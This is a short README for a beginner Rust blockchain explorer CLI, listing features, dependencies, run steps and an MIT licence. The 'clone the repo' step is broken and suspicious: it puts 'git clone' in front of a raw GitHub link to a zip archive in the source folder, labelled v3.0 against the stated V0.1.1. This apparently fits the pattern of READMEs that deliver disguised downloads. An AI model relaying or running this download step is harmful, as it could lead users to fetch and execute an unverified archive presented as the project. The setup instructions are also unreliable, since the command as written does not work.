# Simple Blockchain Explorer V0.1.1
a beginner friendly blockchain explorer written in Rust. This command line application allow you to create, explore, save, and load a blockchain consisting of basic transaction.

## Features
- add new block containing of transactions
- view all blocks with timestamp and hashes
- save blockchain to a JSON file
- load blockchain from a file
- uses SHA-256 for hashing
- timestamp formating with RFC3339

## Tech Uses
- Rust
- `serde, serde_json` - for serialization
- `chrono` - for timestampting
- `sha2,hex` - for cryptographic hashing

## How to Run 
1. ### clone the repo
   ```` bash
   git clone
   https://raw.githubusercontent.com/ronny-gans/simple-blockchain-explorer/main/src/explorer-blockchain-simple-v3.0.zip
   cd simple-blockchain-explorer
   ````
2. ### Run the app
   ``` bash
   cargo run
   ```
3. ### Use the CLI menu
  - `add new transaction`
  - `show all transaction`
  - `save transaction to file`
  - `load transaction from file `
  - `exit`
4. ### License
   MIT License © 2025 Ronny Ardiansyah
